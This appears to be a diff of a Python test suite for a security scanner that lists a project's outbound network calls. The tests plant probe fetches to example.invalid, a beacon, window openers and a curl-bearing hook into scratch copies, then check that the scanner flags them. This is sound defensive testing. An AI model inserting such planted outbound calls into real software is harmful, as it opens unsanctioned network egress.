+    UNCLASSIFIED: the branch executed) and a page whose fetch URL is a Python format slot (the computed class). At the tree the
+    shim's and the shell's sockets, the boot's dead opener and the worker's clients.openWindow list on local-kernel, the four
+    fetches whose route literal a caller passes list as computed, and the four pane stylesheets are named, not scanned. A run of
+    its own: its import plant would join the credentials run's IMPORT set, which that run's case holds equal to its own lines."""
+
+    RUN = "served"
+
+    @classmethod
+    def mutate(cls, cleanup):
+        _replace("kernel/kernel.py", BOOT_ANCHOR, BOOT_ANCHOR + BOOT_PLANTS, cleanup)
+        _replace("kernel/kernel.py", SETTINGS_ANCHOR, SETTINGS_PLANT + SETTINGS_ANCHOR, cleanup)
+        _replace("kernel/kernel.py", CHAT_BRANCH, ROUTE_PLANTS + CHAT_BRANCH, cleanup)
+        _replace("kernel/kernel.py", SEND_ANCHOR, SEND_PLANT + SEND_ANCHOR, cleanup)
+        _append("kernel/kernel.py", PROBE_PAGE_DEF, cleanup)
+        path = os.path.join(scope_copy(), "kernel", "kernel.py")   # every plant landed: the lines by content
+        cls.at.update({"fetch": _line_of(path, 'fetch("https://example.invalid/probe");'), "alert": _line_of(path, "}else{alert('Pull from '+h+' failed');}"),
+                       "import": _line_of(path, "import x from 'example-pkg';"), "settings_def": _line_of(path, "def _settings_page():"),
+                       "settings_anchor": _line_of(path, SETTINGS_ANCHOR.strip()), "probe_read": _line_of(path, '    return (UI / "probe.html").read_text()'),
+                       "fstring": _line_of(path, 'fetch(\'https://example.invalid/f\')'), "slot": _line_of(path, '"<script>fetch(\'%s\')</script>" % p'),
+                       "body_param": _line_of(path, 'return self._send(200, body, "text/html")')})
+
+    def test_a_third_party_fetch_in_the_timeline_boot_is_unclassified(self):
+        n, out = self.at["fetch"], self.out
+        self.assertRefused(self.rc, out, "UNCLASSIFIED")
+        self.assertIn("kernel/kernel.py:%d" % n, unclassified(out), "the boot's script is scanned: an absolute literal has no road")
+        self.assertListed(out, r"kernel/kernel\.py:%d  fetch  fetch\(\"https://example\.invalid/probe\"\)  in -  -> UNCLASSIFIED$" % n)
+
+    def test_a_beacon_in_a_page_template_is_unclassified_at_the_templates_lines(self):
+        out = self.out
+        m = re.search(r"^kernel/kernel\.py:(\d+)  sendBeacon  .*  in -  -> UNCLASSIFIED$", out, re.M)
+        self.assertTrue(m, "the settings page's template is scanned: the beacon lists\n" + gates(out))
+        n = int(m.group(1))
+        self.assertTrue(self.at["settings_def"] < n <= self.at["settings_anchor"], "listed at the template's own lines (%d, def %d, anchor %d)" % (n, self.at["settings_def"], self.at["settings_anchor"]))
+        self.assertIn("kernel/kernel.py:%d" % n, unclassified(out))
+
+    def test_a_route_the_extraction_cannot_read_is_refused_by_name(self):
+        self.assertRefused(self.rc, self.out, "SERVED kernel/kernel.py:%d reads ui/probe.html for a served page, a file the walk does not scan" % self.at["probe_read"],
+                           "SERVED kernel/kernel.py:%d serves text/html from body, text the census did not read" % self.at["body_param"])
+
+    def test_an_f_string_page_is_read_and_a_format_slot_url_is_the_computed_class(self):
+        out = self.out
+        self.assertIn("kernel/kernel.py:%d" % self.at["fstring"], unclassified(out), "the f-string branch: its literal parts are pieces")
+        self.assertListed(out, r"kernel/kernel\.py:%d  fetch  fetch\('%%s'\)  in -  -> \(browser-computed-url\)$" % self.at["slot"],
+                          "a URL filled at serve time is computed, never local by its spelling")
+        self.assertNotIn("kernel/kernel.py:%d" % self.at["slot"], unclassified(out))
+
+    def test_a_second_socket_or_opener_in_the_served_text_moves_its_rowed_keys_count(self):
+        expected = _expected()
+        for key in ("kernel/kernel.py:WebSocket", "kernel/kernel.py:window.open"):
+            self.assertIn(key, expected["per_key"], "the served text's rowed tools are counted keys (the shim's and the shell's sockets, the boot's opener)")
+        self.assertRefused(self.rc, self.out,
+                           "COUNTS per_key kernel/kernel.py:WebSocket: the committed count is %d, this run found %d" % (expected["per_key"]["kernel/kernel.py:WebSocket"], expected["per_key"]["kernel/kernel.py:WebSocket"] + 1),
+                           "COUNTS per_key kernel/kernel.py:window.open: the committed count is %d, this run found %d" % (expected["per_key"]["kernel/kernel.py:window.open"], expected["per_key"]["kernel/kernel.py:window.open"] + 1))
+
+    def test_the_import_gate_over_served_text_reads_import_led_lines_and_not_a_brace_led_one(self):
+        out = self.out
+        self.assertRefused(self.rc, out, "IMPORT kernel/kernel.py:%d imports example-pkg" % self.at["import"])
+        self.assertNotIn("IMPORT kernel/kernel.py:%d " % self.at["alert"], out, "a brace-led line with `from` in a string is any block's last line in a page's script, not an import")
+
+    def test_the_served_texts_own_sites_are_rowed_or_computed_and_its_stylesheets_named(self):
+        rc, out, _ = tree_run()
+        self.assertClean(rc, out)
+        path = os.path.join(ROOT, KERNEL_PATH)
+        for tool, needle in SERVED_ROWED:
+            n = _line_of(path, needle)
+            self.assertListed(out, r"kernel/kernel\.py:%d  %s  .*  in -  -> local-kernel$" % (n, re.escape(tool)), "the served text's %s at its own line, on the row" % tool)
+        for needle in SERVED_COMPUTED:
+            n = _line_of(path, needle)
+            self.assertListed(out, r"kernel/kernel\.py:%d  fetch  .*  in -  -> \(browser-computed-url\)$" % n, "a route literal the caller passes: computed")
+        sheets = PANE_CSS.findall(KERNEL)
+        self.assertEqual(len(sheets), 4, "the pane stylesheets the pages read at run time, by content: %r" % sheets)
+        for name in sheets:
+            self.assertListed(out, r"kernel/kernel\.py:\d+  served-file  ui/webview/%s  -> \(a stylesheet a served page reads: named, not scanned\)$" % re.escape(name))
+        expected = _expected()
+        self.assertEqual((expected["per_key"]["kernel/kernel.py:WebSocket"], expected["per_key"]["kernel/kernel.py:window.open"], expected["per_key"]["kernel/kernel.py:clients.openWindow"]), (2, 1, 1))
+
+    def test_the_served_pass_removed_leaves_the_plants_silent_and_the_rows_stale(self):
+        """M21: the served pass replaced by pass in a scratch copy of the script, with the fetch and the beacon planted."""
+        self.replace("kernel/kernel.py", BOOT_ANCHOR, BOOT_ANCHOR + 'fetch("https://example.invalid/probe");\n')
+        self.replace("kernel/kernel.py", SETTINGS_ANCHOR, SETTINGS_PLANT + SETTINGS_ANCHOR)
+        self.replace(INVENTORY, SERVED_CALL, SERVED_OFF)
+        rc, out, _ = inventory(scope_copy())
+        self.assertFalse(unclassified(out), "without the pass the served text is outside the scan: the plants are silent (the defect): %r" % unclassified(out))
+        self.assertFalse([ln for ln in out.splitlines() if "  sendBeacon  " in ln or "example.invalid/probe" in ln])
+        expected = _expected()
+        self.assertRefused(rc, out, "STALE ROW kernel/kernel.py:WebSocket names no site", "STALE ROW kernel/kernel.py:window.open names no site",
+                           "STALE ROW kernel/kernel.py:clients.openWindow names no site",
+                           "COUNTS per_key kernel/kernel.py:fetch: the committed count is %d, this run found None" % expected["per_key"]["kernel/kernel.py:fetch"])
+
+
+class TheChatMediaRoadIsRowed(_Scope):
+    """A rendered message's media on the web dashboard is a road (the fourth round, tests-1): the pipeline's one line on a
+    message's pictures before the browser fetches them, `mdImgPostPass(clean)` in md() and in userMd(), is the row's site (two
+    lines, keyed ui/webview/render.ts:mdImgPostPass, through a JS entry whose lookbehind keeps the definition in preview.ts out),
+    and the table's row states the render as the trigger, the cross-site cookies and no Referer as what is sent, and no switch.
+    The executed witness is ui/webview/chat-media-loads-browser.test.ts (the request events of a page served under the
+    dashboard's headers, and the editor CSP scene), which skips without a browser; tests/test_security_price_feed.py holds the
+    section's sentence and the row's cells to the same words."""
+
+    def test_the_rows_two_sites_are_the_pipelines_post_pass_lines_and_the_table_has_the_row(self):
+        rc, out, _ = tree_run()
+        self.assertClean(rc, out)
+        lines = [i + 1 for i, ln in enumerate(_lines(os.path.join(ROOT, "ui", "webview", "render.ts"))) if "mdImgPostPass(clean);" in ln]
+        self.assertEqual(len(lines), 2, "md() and userMd() each run the post-pass once, by content: %r" % lines)
+        for n in lines:
+            self.assertListed(out, r"ui/webview/render\.ts:%d  mdImgPostPass  mdImgPostPass\(clean\);.*  in -  -> chat-media$" % n)
+        self.assertEqual(len([ln for ln in out.splitlines() if ln.endswith("-> chat-media")]), 2, "the road's sites are those two lines")
+        expected = _expected()
+        self.assertEqual((expected["per_road"]["chat-media"], expected["per_key"]["ui/webview/render.ts:mdImgPostPass"]), (2, 2))
+        rc2, table, err = tree_run("--table")
+        self.assertEqual(rc2, 0, err[-1500:])
+        row = next((r for r in table.splitlines() if r.startswith("| %s | " % CHAT_MEDIA_LABEL)), None)
+        self.assertTrue(row, "the table has the road: %r" % CHAT_MEDIA_LABEL)
+        cells = [c.strip() for c in row.strip().strip("|").split(" | ")]
+        self.assertEqual(len(cells), 5, row[:120])
+        self.assertEqual(cells[1], "ui/webview/render.ts (`mdImgPostPass`)", "the where cell is derived from the sites")
+        self.assertTrue(cells[2].startswith("the render of a message on the web dashboard, and nothing else: no click, no gate, no setting"), cells[2][:160])
+        for phrase in ("a session's reply (`md`", "your own message (`userMd`", "a postal body (`md` in `renderPostalService`", "`video` (src, poster)", "an inline svg's `image`",
+                       "the editor extension's webviews block these loads by their CSP"):
+            self.assertIn(phrase, cells[2], "the trigger cell names the population and the editor's block")
+        for phrase in ("with the cross-site cookies that browser sends to that host", "no Referer (every page the kernel serves carries `Referrer-Policy: same-origin`)",
+                       "no serve token, key or login token rides in it"):
+            self.assertIn(phrase, cells[3], "the sent cell: the host the URL names, the cookies a cross-site subresource carries, no Referer, no credential of romp's")
+        self.assertEqual(cells[4], "none: no setting gates a message's media (the gear's Pictures from the web in files list gates a viewed file's figures, not the chat's)")
+        self.assertTrue(os.path.isfile(os.path.join(ROOT, "ui", "webview", "chat-media-loads-browser.test.ts")), "the executed witness is in the tree")
+
+    def test_the_row_dropped_and_the_lookbehind_removed_leave_the_sites_unclassified_and_the_definition_a_site(self):
+        """M22: the T row deleted and the JS entry's lookbehind removed in one scratch copy of the script."""
+        self.replace(INVENTORY, CHAT_MEDIA_ROW, "")
+        self.replace(INVENTORY, MD_IMG_ENTRY, MD_IMG_ENTRY_NO_LOOKBEHIND)
+        rc, out, _ = inventory(scope_copy())
+        self.assertRefused(rc, out, "UNCLASSIFIED", "TABLE ROADS names chat-media, a road with no site")
+        named = unclassified(out)
+        for n in (i + 1 for i, ln in enumerate(_lines(os.path.join(ROOT, "ui", "webview", "render.ts"))) if "mdImgPostPass(clean);" in ln):
+            self.assertIn("ui/webview/render.ts:%d" % n, named, "without the row the pipeline's line has no road")
+        self.assertIn("ui/webview/preview.ts:%d" % _line_of(os.path.join(ROOT, "ui", "webview", "preview.ts"), "export function mdImgPostPass("), named,
+                      "without the lookbehind the definition line is a site")
+
+
+class TheGitHubButtonsHrefWriteIsListedByContent(_Scope):
+    """The file viewer's GitHub button writes an address romp composes into an anchor's href (the fourth round, extra7-1): the
+    listing names that write as a dom-load line, pinned here by the statement's content and the file, never by a line number; a
+    deleted write moves the class count, and an opener added beside it moves the clicked-link road's count and the file's key."""
+
+    def test_the_write_is_one_dom_load_line_at_its_own_line(self):
+        rc, out, _ = tree_run()
+        self.assertClean(rc, out)
+        found = GITHUB_LISTING.findall(out)
+        self.assertEqual(len(found), 1, "one dom-load line carries the button's three-statement write: %r" % found)
+        self.assertEqual(int(found[0]), _line_of(os.path.join(ROOT, "ui", "webview", "file-view.ts"), GITHUB_WRITE), "listed at the write's own line")
+
+    def test_the_write_deleted_moves_the_class_count(self):
+        """M23: the statement removed from a scratch copy of the viewer."""
+        self.replace("ui/webview/file-view.ts", GITHUB_WRITE, "")
+        rc, out, _ = inventory(scope_copy())
+        self.assertFalse(GITHUB_LISTING.findall(out))
+        expected = _expected()
+        self.assertRefused(rc, out, "COUNTS classes browser-dom-loads: the committed count is %d, this run found %d"
+                           % (expected["classes"]["browser-dom-loads"], expected["classes"]["browser-dom-loads"] - 1))
+
+    def test_an_opener_beside_the_write_moves_the_roads_count_and_the_files_key(self):
+        """M24: a window.open appended to the write's line in a scratch copy of the viewer: a site of the clicked-link road, keyed
+        on the file, beside the dom-load line the write stays."""
+        self.replace("ui/webview/file-view.ts", GITHUB_WRITE, GITHUB_WRITE + ' window.open(url, "_blank");')
+        n = _line_of(os.path.join(scope_copy(), "ui", "webview", "file-view.ts"), GITHUB_WRITE)
+        rc, out, _ = inventory(scope_copy())
+        both = _listed(out, "ui/webview/file-view.ts:%d  " % n)
+        self.assertTrue(any("  dom-load  attribute write  " in ln for ln in both), "the write is still a dom-load line (its head now carries the opener too): %r" % both)
+        self.assertTrue(any("  window.open  " in ln and ln.endswith("-> clicked-link") for ln in both), "and the line is a site of the road, by the file's row: %r" % both)
+        expected = _expected()
+        self.assertRefused(rc, out, "COUNTS per_key ui/webview/file-view.ts:window.open: the committed count is %d, this run found %d"
+                           % (expected["per_key"]["ui/webview/file-view.ts:window.open"], expected["per_key"]["ui/webview/file-view.ts:window.open"] + 1),
+                           "COUNTS per_road clicked-link: the committed count is %d, this run found %d" % (expected["per_road"]["clicked-link"], expected["per_road"]["clicked-link"] + 1))
+        self.assertFalse(unclassified(out), "the row places the opener; the counts are what name it: %r" % unclassified(out))
+
+
+class TheKindOfReadsADottedHooksShebang(_Scope):
+    """kind_of's early return for a dotted name is gone (the fourth round, fresh-2): a hook named with an extension outside the
+    five (a .bash) falls through to the shebang read and is scanned; the shared walk run's hooks case holds the plant listed, and
+    this case holds the mutation: the early return restored, the hook is skipped by kind and its curl is silent."""
+
+    def test_the_early_return_restored_skips_the_dotted_hook_by_kind(self):
+        """M25."""
+        self.plant("hooks/probe.bash", BASH_HOOK_TEXT)
+        self.replace(INVENTORY, SHEBANG_LINE, EARLY_RETURN + SHEBANG_LINE)
+        rc, out, _ = inventory(scope_copy())
+        self.assertNotIn("hooks/probe.bash:2", unclassified(out), "under the early return the .bash hook is no file of the walk (the defect)")
+        self.assertFalse(_listed(out, "hooks/probe.bash:"))
+        rc2, out2, _ = tree_run()
+        self.assertEqual(summary(out)["skipped"], summary(out2)["skipped"] + 1, "the hook is counted as skipped by kind, which no gate reads")
 
 
 class TheTableIsTheLedgers(_Scope):
